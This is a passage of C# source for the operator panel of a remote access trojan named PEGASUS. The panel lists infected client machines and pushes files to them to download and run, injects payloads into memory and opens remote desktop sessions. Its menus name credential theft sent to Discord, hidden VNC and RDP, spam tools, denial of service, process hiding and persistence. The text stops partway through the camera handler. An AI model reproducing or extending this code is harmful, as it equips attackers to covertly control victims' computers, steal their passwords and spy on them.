using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Text;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using cGeoIp;
using dnlib.DotNet;
using dnlib.DotNet.Emit;
using Guna.UI2.AnimatorNS;
using Guna.UI2.WinForms;
using PEGASUS.Algorithm;
using PEGASUS.Connection;
using PEGASUS.Helper;
using PEGASUS.MessagePack;
using PEGASUS.Properties;

namespace PEGASUS.Forms
{

	public class PEGASUSMain : Form
	{
		private enum PROCESS_DPI_AWARENESS
		{
			Process_DPI_Unaware,
			Process_System_DPI_Aware,
			Process_Per_Monitor_DPI_Aware
		}

		private bool trans;

		public cGeoMain cGeoMain = new cGeoMain();

		public static List<AsyncTask> getTasks = new List<AsyncTask>();

		private ListViewColumnSorter lvwColumnSorter;

		public static string userFame = Environment.UserName;

		public static string userName = WindowsIdentity.GetCurrent().Name;

		private readonly FormDOS formDOS;

		public static Aes256 aes256;

		private readonly Random random = new Random();

		private const string alphabet = "asdfghjklqwertyuiopmnbvcxz";

		public static string exports = Path.Combine(Application.StartupPath, "Plugins");

		public static string export = Path.Combine(exports, "exterminal.exe");

		public static string terminal = Path.Combine(exports, "terminal.exe");

		private IContainer components;

		private System.Windows.Forms.Timer ping;

		private System.Windows.Forms.Timer UpdateUI;

		private PerformanceCounter performanceCounter1;

		private PerformanceCounter performanceCounter2;

		private ContextMenuStrip contextMenuThumbnail;

		private ToolStripMenuItem sTARTToolStripMenuItem;

		private ToolStripMenuItem sTOPToolStripMenuItem;

		public ImageList ThumbnailImageList;

		public NotifyIcon notifyIcon1;

		private System.Windows.Forms.Timer TimerTask;

		private ContextMenuStrip contextMenuLogs;

		private ToolStripMenuItem cLEARToolStripMenuItem;

		private TabControl tabControl1;

		private TabPage tabPage1;

		private TabPage tabPage3;

		public ListView listView3;

		private TabPage tabPage4;

		public ListView listView4;

		private ColumnHeader columnHeader4;

		private ColumnHeader columnHeader5;

		public ListView listView2;

		private ColumnHeader columnHeader1;

		private ColumnHeader columnHeader2;

		private System.Windows.Forms.Timer ConnectTimeout;

		private Guna2BorderlessForm guna2BorderlessForm1;

		private TabPage tabPage2;

		private Guna2Panel LISTVIEWSPANEL1;

		private ToolStripMenuItem toolStripMenuItem14;

		private ToolStripMenuItem toolStripMenuItem15;

		private ToolStripMenuItem toolStripMenuItem16;

		private ToolStripMenuItem toolStripMenuItem17;

		private ToolStripMenuItem toolStripMenuItem18;

		private ToolStripMenuItem toolStripMenuItem19;

		private ToolStripMenuItem toolStripMenuItem20;

		private ToolStripMenuItem toolStripMenuItem21;

		private ToolStripMenuItem toolStripMenuItem22;

		private ToolStripMenuItem toolStripMenuItem23;

		private ToolStripMenuItem toolStripMenuItem24;

		private Guna2Panel LISTVIEWSPANELSMALL2;

		private Guna2PictureBox guna2PictureBox3;

		private Guna2PictureBox guna2PictureBox2;

		private Guna2PictureBox guna2PictureBox1;

		public ListView listView1;

		private ToolStripStatusLabel toolStripStatusLabel1;

		private ToolStripStatusLabel toolStripStatusLabel2;

		private Panel panel3;

		private Panel panel2;

		private Panel panel1;

		private Guna2Transition guna2Transition1;

		private Guna2Transition guna2Transition2;

		private Guna2ContextMenuStrip guna2ContextMenuStrip2;

		private ToolStripMenuItem toolStripMenuItem61;

		private ToolStripMenuItem toolStripMenuItem62;

		private ToolStripMenuItem toolStripMenuItem63;

		private ToolStripMenuItem toolStripMenuItem64;

		private ToolStripMenuItem toolStripMenuItem65;

		private ToolStripMenuItem toolStripMenuItem66;

		private ToolStripMenuItem toolStripMenuItem67;

		private ToolStripMenuItem toolStripMenuItem68;

		private ToolStripMenuItem toolStripMenuItem69;

		private ToolStripMenuItem toolStripMenuItem70;

		private PictureBox pictureBox1;

		private Label label1;

		private Guna2PictureBox guna2PictureBox4;

		private Guna2NotificationPaint guna2NotificationPaint1;

		public ColumnHeader lv_country;

		public ColumnHeader lv_group;

		public ColumnHeader lv_hwid;

		public ColumnHeader lv_user;

		public ColumnHeader lv_camera;

		public ColumnHeader lv_os;

		public ColumnHeader lv_version;

		public ColumnHeader lv_ins;

		public ColumnHeader lv_admin;

		public ColumnHeader lv_av;

		public ColumnHeader lv_ping;

		public ColumnHeader lv_act;

		private ColumnHeader lv_ip;

		private Guna2Separator guna2Separator1;

		private Guna2Panel buttonspanel;

		private Guna2GradientButton btnStopL;

		private Guna2GradientButton btnStartL;

		private Guna2NumericUpDown numPort;

		private Guna2ShadowPanel guna2ShadowPanel1;

		private Guna2ShadowPanel LISTVIEWPANEL0;

		private Guna2Transition loadForm;

		private Guna2Transition guna2Transition3;

		private Guna2Separator guna2Separator2;

		private Label label3;

		private Label Listener;

		private Label label2;

		private StatusStrip statusStrip1;

		private ToolStripStatusLabel toolStripStatusLabel3;

		private Label label4;

		private Guna2Panel guna2Panel1;

		private Guna2VSeparator guna2VSeparator1;

		private Guna2Panel guna2Panel2;

		private Guna2NumericUpDown guna2NumericUpDown1;

		private Guna2GradientButton guna2GradientButton1;

		private Guna2GradientButton guna2GradientButton2;

		private Guna2Shapes guna2Shapes4;

		private Guna2Shapes guna2Shapes3;

		private Guna2Shapes guna2Shapes2;

		private Guna2Shapes guna2Shapes1;

		private Guna2Shapes guna2Shapes5;

		private Guna2VSeparator guna2VSeparator2;

		private Label label5;

		private Label label6;

		private Guna2PictureBox guna2PictureBox5;

		private Guna2HtmlToolTip guna2HtmlToolTip1;

		private Guna2ContextMenuStrip guna2ContextMenuStrip1;

		private ToolStripMenuItem tasksControlToolStripMenuItem;

		private ToolStripMenuItem onToolStripMenuItem;

		private ToolStripMenuItem offToolStripMenuItem;

		private ToolStripMenuItem toolStripMenuItem1;

		private ToolStripMenuItem toolStripMenuItem2;

		private ToolStripMenuItem toolStripMenuItem3;

		private ToolStripMenuItem toolStripMenuItem4;

		private ToolStripMenuItem toolStripMenuItem5;

		private ToolStripMenuItem toolStripMenuItem6;

		private ToolStripMenuItem toolStripMenuItem7;

		private ToolStripMenuItem toolStripMenuItem8;

		private ToolStripMenuItem toolStripMenuItem9;

		private ToolStripMenuItem toolStripMenuItem10;

		private ToolStripMenuItem toolStripMenuItem11;

		private ToolStripMenuItem toolStripMenuItem12;

		private ToolStripMenuItem toolStripMenuItem13;

		private ToolStripMenuItem toolStripMenuItem71;

		private ToolStripMenuItem toolStripMenuItem72;

		private ToolStripMenuItem toolStripMenuItem73;

		private ToolStripMenuItem toolStripMenuItem74;

		private ToolStripMenuItem toolStripMenuItem78;

		private ToolStripMenuItem toolStripMenuItem25;

		private ToolStripMenuItem toolStripMenuItem26;

		private ToolStripMenuItem toolStripMenuItem27;

		private ToolStripMenuItem toolStripMenuItem28;

		private ToolStripMenuItem toolStripMenuItem29;

		private ToolStripMenuItem toolStripMenuItem30;

		private ToolStripMenuItem toolStripMenuItem32;

		private ToolStripMenuItem toolStripMenuItem33;

		private ToolStripMenuItem toolStripMenuItem40;

		private ToolStripMenuItem toolStripMenuItem41;

		private ToolStripMenuItem toolStripMenuItem42;

		private ToolStripMenuItem toolStripMenuItem43;

		private ToolStripMenuItem toolStripMenuItem34;

		private ToolStripMenuItem toolStripMenuItem35;

		private ToolStripMenuItem toolStripMenuItem36;

		private ToolStripMenuItem toolStripMenuItem37;

		private ToolStripMenuItem toolStripMenuItem38;

		private ToolStripMenuItem toolStripMenuItem39;

		private ToolStripMenuItem hVNChBrowsersToolStripMenuItem;

		private ToolStripMenuItem toolStripMenuItem44;

		private ToolStripMenuItem toolStripMenuItem45;

		private ToolStripMenuItem toolStripMenuItem46;

		private ToolStripMenuItem toolStripMenuItem48;

		private ToolStripMenuItem toolStripMenuItem47;

		private ToolStripMenuItem toolStripMenuItem49;

		private ToolStripMenuItem toolStripMenuItem50;

		private ToolStripMenuItem toolStripMenuItem51;

		private ToolStripMenuItem toolStripMenuItem52;

		private ToolStripMenuItem toolStripMenuItem53;

		private ToolStripMenuItem passwordRecoveryToolStripMenuItem;

		private ToolStripMenuItem toolStripMenuItem31;

		private ToolStripMenuItem sKYNETToolStripMenuItem;

		private ToolStripMenuItem recoverAllSendToDiscordToolStripMenuItem;

		private ToolStripMenuItem toolStripMenuItem54;

		private ToolStripMenuItem toolStripMenuItem55;

		private ToolStripMenuItem toolStripMenuItem56;

		private ToolStripMenuItem startToolStripMenuItem1;

		private ToolStripMenuItem stopToolStripMenuItem1;

		private ToolStripMenuItem hIDEPEGASUSPROCESSToolStripMenuItem;

		private ToolStripMenuItem toolStripMenuItem82;

		private ToolStripMenuItem toolStripMenuItem83;

		private ToolStripMenuItem watchDogToolStripMenuItem;

		private ToolStripMenuItem startToolStripMenuItem3;

		private ToolStripMenuItem stopToolStripMenuItem2;

		private ToolStripMenuItem taskMgrDogToolStripMenuItem;

		private ToolStripMenuItem startToolStripMenuItem4;

		private ToolStripMenuItem stopToolStripMenuItem4;

		private ToolStripMenuItem toolStripMenuItem57;

		private ToolStripMenuItem toolStripMenuItem60;

		private ToolStripMenuItem toolStripMenuItem59;

		private ToolStripMenuItem pEGASUSBUILDERToolStripMenuItem;

		private ToolStripMenuItem sKYNETSHOPToolStripMenuItem;

		private ToolStripMenuItem toolStripMenuItem58;

		private ToolStripMenuItem hVNCCToolStripMenuItem;

		private ToolStripMenuItem toolStripMenuItem84;

		private ToolStripMenuItem toolStripMenuItem85;

		private ToolStripMenuItem hVNCCToolStripMenuItem1;

		private ToolStripMenuItem hVNCCStartToolStripMenuItem;

		private ToolStripMenuItem stopToolStripMenuItem3;

		private ToolStripMenuItem openSupportTicketToolStripMenuItem;

		private ToolStripMenuItem addPEGASUSSheduleTaskToolStripMenuItem;

		private ToolStripMenuItem addPEGASUSToStartupToolStripMenuItem;

		private ToolStripMenuItem spamToolsToolStripMenuItem;

		private ToolStripMenuItem sendEmailFromClientPCToolStripMenuItem;

		private ToolStripMenuItem webHookSpammerToolStripMenuItem;

		private ToolStripMenuItem chatSpammerToolStripMenuItem;

		private ToolStripMenuItem startToolStripMenuItem2;

		private ToolStripMenuItem stopToolStripMenuItem5;

		private ToolStripMenuItem executeVBSToolStripMenuItem;

		private ToolStripMenuItem mergeRegToolStripMenuItem;

		private ToolStripMenuItem executebatToolStripMenuItem;

		private ToolStripMenuItem silentInstallerToolStripMenuItem;

		private ToolStripMenuItem cmdToolStripMenuItem;

		private ToolStripMenuItem powershellToolStripMenuItem;

		private ToolStripMenuItem toolStripMenuItem75;

		private ToolStripMenuItem toolStripMenuItem81;

		private ToolStripMenuItem toolStripMenuItem76;

		private ToolStripMenuItem toolStripMenuItem77;

		private ToolStripMenuItem toolStripMenuItem79;

		private ToolStripMenuItem toolStripMenuItem80;

		private ToolStripMenuItem uploadsPluginToolStripMenuItem;

		private ToolStripMenuItem hiddenRDPToolStripMenuItem;

		private ToolStripMenuItem HRDPconnectToolStripMenuItem;

		private ToolStripMenuItem HRDPcleanUnistallToolStripMenuItem;

		private ToolStripMenuItem copyProfileToolStripMenuItem;

		private ToolStripMenuItem connectToolStripMenuItem;

		public PEGASUSMain()
		{
			InitializeComponent();
			SetWindowTheme(listView1.Handle, "explorer", null);
			base.Opacity = 0.0;
			formDOS = new FormDOS
			{
				Name = "DOS",
				Text = "DOS"
			};
			TryEnableDPIAware();
		}

		[DllImport("SHCore.dll")]
		private static extern bool SetProcessDpiAwareness(PROCESS_DPI_AWARENESS awareness);

		[DllImport("user32.dll", SetLastError = true)]
		private static extern bool SetProcessDPIAware();

		internal static void TryEnableDPIAware()
		{
			try
			{
				SetProcessDpiAwareness(PROCESS_DPI_AWARENESS.Process_Per_Monitor_DPI_Aware);
			}
			catch
			{
				try
				{
					SetProcessDPIAware();
				}
				catch
				{
				}
			}
		}

		private Clients[] GetSelectedClients()
		{
			List<Clients> clientsList = new List<Clients>();
			Invoke((MethodInvoker)delegate
			{
				lock (Settings.LockListviewClients)
				{
					if (listView1.SelectedItems.Count == 0)
					{
						return;
					}
					foreach (ListViewItem selectedItem in listView1.SelectedItems)
					{
						clientsList.Add((Clients)selectedItem.Tag);
					}
				}
			});
			return clientsList.ToArray();
		}

		private Clients[] GetAllClients()
		{
			List<Clients> clientsList = new List<Clients>();
			Invoke((MethodInvoker)delegate
			{
				lock (Settings.LockListviewClients)
				{
					if (listView1.Items.Count == 0)
					{
						return;
					}
					foreach (ListViewItem item in listView1.Items)
					{
						clientsList.Add((Clients)item.Tag);
					}
				}
			});
			return clientsList.ToArray();
		}

		private async void Connect()
		{
			try
			{
				await Task.Delay(1000);
				string[] array = PEGASUS.Properties.Settings.Default.Ports.Split(',');
				foreach (string text in array)
				{
					if (!string.IsNullOrWhiteSpace(text))
					{
						Thread thread = new Thread(new Listener().Connect);
						thread.IsBackground = true;
						thread.Start(Convert.ToInt32(text.ToString().Trim()));
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
				Environment.Exit(0);
			}
		}

		private void SetLastColumnWidth()
		{
			listView1.Columns[listView1.Columns.Count - 1].Width = -2;
		}

		private void SetLastColumnWidth2()
		{
		}

		private void SetLastColumnWidth3()
		{
			listView4.Columns[listView4.Columns.Count - 1].Width = -2;
		}

		private async void Form1_Load(object sender, EventArgs e)
		{
			label5.Text = userFame;
			guna2Transition3.ShowSync(LISTVIEWPANEL0);
			ListviewDoubleBuffer.Enable(listView1);
			ListviewDoubleBuffer.Enable(listView2);
			ListviewDoubleBuffer.Enable(listView3);
			listView1.Columns[1].TextAlign = HorizontalAlignment.Center;
			listView1.Columns[2].TextAlign = HorizontalAlignment.Center;
			listView1.Columns[3].TextAlign = HorizontalAlignment.Center;
			listView1.Columns[4].TextAlign = HorizontalAlignment.Center;
			listView1.Columns[5].TextAlign = HorizontalAlignment.Center;
			listView1.Columns[6].TextAlign = HorizontalAlignment.Center;
			listView1.Columns[7].TextAlign = HorizontalAlignment.Center;
			listView1.Columns[8].TextAlign = HorizontalAlignment.Center;
			listView1.Columns[9].TextAlign = HorizontalAlignment.Center;
			listView1.Columns[10].TextAlign = HorizontalAlignment.Center;
			listView1.Columns[11].TextAlign = HorizontalAlignment.Center;
			listView1.Columns[12].TextAlign = HorizontalAlignment.Center;
			SetLastColumnWidth();
			listView1.Layout += delegate
			{
				SetLastColumnWidth();
			};
			listView1.View = View.Details;
			listView1.HideSelection = false;
			listView1.OwnerDraw = true;
			listView1.GridLines = false;
			listView1.BackColor = Color.FromArgb(24, 24, 24);
			listView1.DrawColumnHeader += delegate (object sender1, DrawListViewColumnHeaderEventArgs args)
			{
				Brush brush2 = new SolidBrush(Color.FromArgb(30, 30, 30));
				args.Graphics.FillRectangle(brush2, args.Bounds);
				TextRenderer.DrawText(args.Graphics, args.Header.Text, args.Font, args.Bounds, Color.WhiteSmoke);
			};
			listView1.DrawItem += delegate (object sender1, DrawListViewItemEventArgs args)
			{
				args.DrawDefault = true;
			};
			listView1.DrawSubItem += delegate (object sender1, DrawListViewSubItemEventArgs args)
			{
				args.DrawDefault = true;
			};
			SetLastColumnWidth3();
			listView4.Layout += delegate
			{
				SetLastColumnWidth3();
			};
			listView4.View = View.Details;
			listView4.HideSelection = false;
			listView4.OwnerDraw = true;
			listView4.GridLines = false;
			listView4.BackColor = Color.FromArgb(24, 24, 24);
			listView4.DrawColumnHeader += delegate (object sender1, DrawListViewColumnHeaderEventArgs args)
			{
				Brush brush = new SolidBrush(Color.FromArgb(30, 30, 30));
				args.Graphics.FillRectangle(brush, args.Bounds);
				TextRenderer.DrawText(args.Graphics, args.Header.Text, args.Font, args.Bounds, Color.WhiteSmoke);
			};
			listView4.DrawItem += delegate (object sender1, DrawListViewItemEventArgs args)
			{
				args.DrawDefault = true;
			};
			listView4.DrawSubItem += delegate (object sender1, DrawListViewSubItemEventArgs args)
			{
				args.DrawDefault = true;
			};
			lvwColumnSorter = new ListViewColumnSorter();
			listView1.ListViewItemSorter = lvwColumnSorter;
			Text = Settings.Version ?? "";
			using (Login login = new Login())
			{
				login.ShowDialog();
			}
			using (FormPorts formPorts = new FormPorts())
			{
				formPorts.ShowDialog();
			}
			if (!File.Exists(Path.Combine(Path.GetTempPath(), "PEGASUSCertificate.p12")))
			{
				Application.Exit();
			}
			await Methods.FadeIn(this, 5);
			trans = true;
			_ = PEGASUS.Properties.Settings.Default.Notification;
		}

		private void Form1_Activated(object sender, EventArgs e)
		{
			if (trans)
			{
				base.Opacity = 1.0;
			}
		}

		private void Form1_Deactivate(object sender, EventArgs e)
		{
			base.Opacity = 0.95;
		}

		private void Form1_FormClosed(object sender, FormClosedEventArgs e)
		{
			notifyIcon1.Dispose();
			File.Delete(Path.GetTempPath() + "\\PEGASUSCertificate.p12");
			File.Delete(Path.GetTempPath() + "\\Client.exe");
			if (File.Exists(Application.StartupPath + "\\Plugins"))
			{
				DeleteDirectory(Application.StartupPath + "\\Plugins");
			}
			Environment.Exit(0);
		}

		public static void DeleteDirectory(string target_dir)
		{
			string[] files = Directory.GetFiles(target_dir);
			string[] directories = Directory.GetDirectories(target_dir);
			string[] array = files;
			foreach (string path in array)
			{
				File.SetAttributes(path, System.IO.FileAttributes.Normal);
				File.Delete(path);
			}
			array = directories;
			for (int i = 0; i < array.Length; i++)
			{
				DeleteDirectory(array[i]);
			}
			Directory.Delete(target_dir, recursive: false);
		}

		private void listView1_KeyDown(object sender, KeyEventArgs e)
		{
			if (listView1.Items.Count <= 0 || e.Modifiers != Keys.Control || e.KeyCode != Keys.A)
			{
				return;
			}
			foreach (ListViewItem item in listView1.Items)
			{
				item.Selected = true;
			}
		}

		private void listView1_MouseMove(object sender, MouseEventArgs e)
		{
			if (listView1.Items.Count > 1)
			{
				ListViewHitTestInfo listViewHitTestInfo = listView1.HitTest(e.Location);
				if (e.Button == MouseButtons.Left && (listViewHitTestInfo.Item != null || listViewHitTestInfo.SubItem != null))
				{
					listView1.Items[listViewHitTestInfo.Item.Index].Selected = true;
				}
			}
		}

		private void ListView1_ColumnClick(object sender, ColumnClickEventArgs e)
		{
			if (e.Column == lvwColumnSorter.SortColumn)
			{
				if (lvwColumnSorter.Order == SortOrder.Ascending)
				{
					lvwColumnSorter.Order = SortOrder.Descending;
				}
				else
				{
					lvwColumnSorter.Order = SortOrder.Ascending;
				}
			}
			else
			{
				lvwColumnSorter.SortColumn = e.Column;
				lvwColumnSorter.Order = SortOrder.Ascending;
			}
			listView1.Sort();
		}

		private void ToolStripStatusLabel2_Click(object sender, EventArgs e)
		{
			if (PEGASUS.Properties.Settings.Default.Notification)
			{
				PEGASUS.Properties.Settings.Default.Notification = false;
				toolStripStatusLabel2.ForeColor = Color.White;
				label3.ForeColor = Color.Red;
				label3.Text = "Off";
			}
			else
			{
				PEGASUS.Properties.Settings.Default.Notification = true;
				toolStripStatusLabel2.ForeColor = Color.White;
				label3.ForeColor = Color.FromArgb(191, 37, 33);
				label3.Text = "On";
			}
			PEGASUS.Properties.Settings.Default.Save();
		}

		private void ping_Tick(object sender, EventArgs e)
		{
			if (listView1.Items.Count > 0)
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "Ping";
				msgPack.ForcePathObject("Message").AsString = "This is a ping!";
				Clients[] allClients = GetAllClients();
				for (int i = 0; i < allClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(allClients[i].Send, msgPack.Encode2Bytes());
				}
				GC.Collect();
			}
		}

		private void UpdateUI_Tick(object sender, EventArgs e)
		{
			Text = Settings.Version + "     " + DateTime.Now.ToLongTimeString();
			lock (Settings.LockListviewClients)
			{
				toolStripStatusLabel3.Text = $"Online Client/s {listView1.Items.Count.ToString()}     Selected Client/s {listView1.SelectedItems.Count.ToString()}                    Bytes Sent {Methods.BytesToString(Settings.SentValue).ToString()}    Bytes Received  {Methods.BytesToString(Settings.ReceivedValue).ToString()}                    CPU {(int)performanceCounter1.NextValue()}%     Ram {(int)performanceCounter2.NextValue()}%                  Admin: {userFame}";
			}
		}

		private void CLEARToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				lock (Settings.LockListviewLogs)
				{
					listView2.Items.Clear();
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		private void STARTToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (listView1.Items.Count > 0)
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "thumbnails";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\OPT.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] allClients = GetAllClients();
				for (int i = 0; i < allClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(allClients[i].Send, msgPack2.Encode2Bytes());
				}
			}
		}

		private void STOPToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (listView1.Items.Count > 0)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "thumbnailsStop";
					foreach (ListViewItem item in listView3.Items)
					{
						ThreadPool.QueueUserWorkItem(((Clients)item.Tag).Send, msgPack.Encode2Bytes());
					}
				}
				listView3.Items.Clear();
				ThumbnailImageList.Images.Clear();
				foreach (ListViewItem item2 in listView1.Items)
				{
					((Clients)item2.Tag).LV2 = null;
				}
			}
			catch
			{
			}
		}

		private void DELETETASKToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (listView4.SelectedItems.Count <= 0)
			{
				return;
			}
			foreach (ListViewItem selectedItem in listView4.SelectedItems)
			{
				selectedItem.Remove();
			}
		}

		private async void TimerTask_Tick(object sender, EventArgs e)
		{
			try
			{
				Clients[] clients = GetAllClients();
				if (getTasks.Count <= 0 || clients.Length == 0)
				{
					return;
				}
				foreach (AsyncTask item in getTasks.ToList())
				{
					if (!GetListview(item.id))
					{
						getTasks.Remove(item);
						return;
					}
					Clients[] array = clients;
					foreach (Clients clients2 in array)
					{
						if (!item.doneClient.Contains(clients2.ID))
						{
							if (clients2.Admin)
							{
								item.doneClient.Add(clients2.ID);
								SetExecution(item.id);
								ThreadPool.QueueUserWorkItem(clients2.Send, item.msgPack);
							}
							else if (!clients2.Admin && !item.admin)
							{
								item.doneClient.Add(clients2.ID);
								SetExecution(item.id);
								ThreadPool.QueueUserWorkItem(clients2.Send, item.msgPack);
							}
						}
					}
					await Task.Delay(15000);
				}
			}
			catch
			{
			}
		}

		private void DownloadAndExecuteToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				OpenFileDialog openFileDialog = new OpenFileDialog();
				if (openFileDialog.ShowDialog() != DialogResult.OK)
				{
					return;
				}
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "sendFile";
				msgPack.ForcePathObject("Update").AsString = "false";
				msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(openFileDialog.FileName)));
				msgPack.ForcePathObject("FileName").AsString = Path.GetFileName(openFileDialog.FileName);
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SF.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				ListViewItem listViewItem = new ListViewItem();
				listViewItem.Text = "SendFile: " + Path.GetFileName(openFileDialog.FileName);
				listViewItem.SubItems.Add("0");
				listViewItem.ToolTipText = Guid.NewGuid().ToString();
				if (listView4.Items.Count > 0)
				{
					foreach (ListViewItem item in listView4.Items)
					{
						if (item.Text == listViewItem.Text)
						{
							return;
						}
					}
				}
				Program.form1.listView4.Items.Add(listViewItem);
				Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
				getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem.ToolTipText, _admin: false));
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		private void SENDFILETOMEMORYToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				FormSendFileToMemory formSendFileToMemory = new FormSendFileToMemory();
				formSendFileToMemory.ShowDialog();
				if (formSendFileToMemory.toolStripStatusLabel1.Text.Length > 0 && formSendFileToMemory.toolStripStatusLabel1.ForeColor == Color.FromArgb(3, 130, 200))
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "sendMemory";
					msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(formSendFileToMemory.toolStripStatusLabel1.Tag.ToString())));
					if (formSendFileToMemory.comboBox1.SelectedIndex == 0)
					{
						msgPack.ForcePathObject("Inject").AsString = "";
					}
					else
					{
						msgPack.ForcePathObject("Inject").AsString = formSendFileToMemory.comboBox2.Text;
					}
					ListViewItem listViewItem = new ListViewItem();
					listViewItem.Text = "SendMemory: " + Path.GetFileName(formSendFileToMemory.toolStripStatusLabel1.Tag.ToString());
					listViewItem.SubItems.Add("0");
					listViewItem.ToolTipText = Guid.NewGuid().ToString();
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SM.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					if (listView4.Items.Count > 0)
					{
						foreach (ListViewItem item in listView4.Items)
						{
							if (item.Text == listViewItem.Text)
							{
								return;
							}
						}
					}
					Program.form1.listView4.Items.Add(listViewItem);
					Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
					getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem.ToolTipText, _admin: false));
				}
				formSendFileToMemory.Close();
				formSendFileToMemory.Dispose();
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		private void UPDATEToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				OpenFileDialog openFileDialog = new OpenFileDialog();
				if (openFileDialog.ShowDialog() != DialogResult.OK)
				{
					return;
				}
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "sendFile";
				msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(openFileDialog.FileName)));
				msgPack.ForcePathObject("FileName").AsString = Path.GetFileName(openFileDialog.FileName);
				msgPack.ForcePathObject("Update").AsString = "true";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SF.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				ListViewItem listViewItem = new ListViewItem();
				listViewItem.Text = "Update: " + Path.GetFileName(openFileDialog.FileName);
				listViewItem.SubItems.Add("0");
				listViewItem.ToolTipText = Guid.NewGuid().ToString();
				if (listView4.Items.Count > 0)
				{
					foreach (ListViewItem item in listView4.Items)
					{
						if (item.Text == listViewItem.Text)
						{
							return;
						}
					}
				}
				Program.form1.listView4.Items.Add(listViewItem);
				Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
				getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem.ToolTipText, _admin: false));
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		private bool GetListview(string id)
		{
			foreach (ListViewItem item in Program.form1.listView4.Items)
			{
				if (item.ToolTipText == id)
				{
					return true;
				}
			}
			return false;
		}

		private void SetExecution(string id)
		{
			foreach (ListViewItem item in Program.form1.listView4.Items)
			{
				if (item.ToolTipText == id)
				{
					int num = Convert.ToInt32(item.SubItems[1].Text);
					item.SubItems[1].Text = (num + 1).ToString();
				}
			}
		}

		[DllImport("uxtheme", CharSet = CharSet.Unicode)]
		public static extern int SetWindowTheme(IntPtr hWnd, string textSubAppName, string textSubIdList);

		private void aboutToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			using FormAbout formAbout = new FormAbout();
			formAbout.ShowDialog();
		}

		private void RemoteShellToolStripMenuItem_Click(object sender, EventArgs e)
		{
		}

		private void RemoteScreenToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\RD.dll");
				Clients[] selectedClients = GetSelectedClients();
				foreach (Clients clients in selectedClients)
				{
					if ((FormRemoteDesktop)Application.OpenForms["RemoteDesktop:" + clients.ID] == null)
					{
						FormRemoteDesktop formRemoteDesktop = new FormRemoteDesktop();
						formRemoteDesktop.Name = "RemoteDesktop:" + clients.ID;
						formRemoteDesktop.F = this;
						formRemoteDesktop.Text = "RemoteDesktop:" + clients.ID;
						formRemoteDesktop.ParentClient = clients;
						formRemoteDesktop.FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", clients.ID, "RemoteDesktop");
						formRemoteDesktop.Show();
						clients.LV.ForeColor = Color.FromArgb(191, 38, 33);
						ThreadPool.QueueUserWorkItem(clients.Send, msgPack.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		private void RemoteCameraToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
